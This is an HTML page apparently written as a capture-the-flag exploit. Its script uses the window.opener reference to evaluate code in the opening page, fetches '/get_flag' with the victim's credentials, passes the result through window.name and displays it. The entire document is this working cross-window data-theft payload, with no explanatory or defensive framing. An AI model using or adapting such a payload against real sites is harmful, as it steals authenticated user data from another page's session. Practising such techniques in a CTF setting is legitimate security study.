<!DOCTYPE html>
<html>
<body>
<script>
if (window.opener) {
  window.opener.eval(`
    fetch('/get_flag', { credentials: 'include' })
      .then(r => r.text())
      .then(flag => {
        window.name = flag;
      });
  `);

  setTimeout(() => {
    const win = window.open('', '_self');
    win.document.write('<h1>Flag:</h1><pre>' + window.name + '</pre>');
  }, 1500);
}
</script>
</body>
</html>
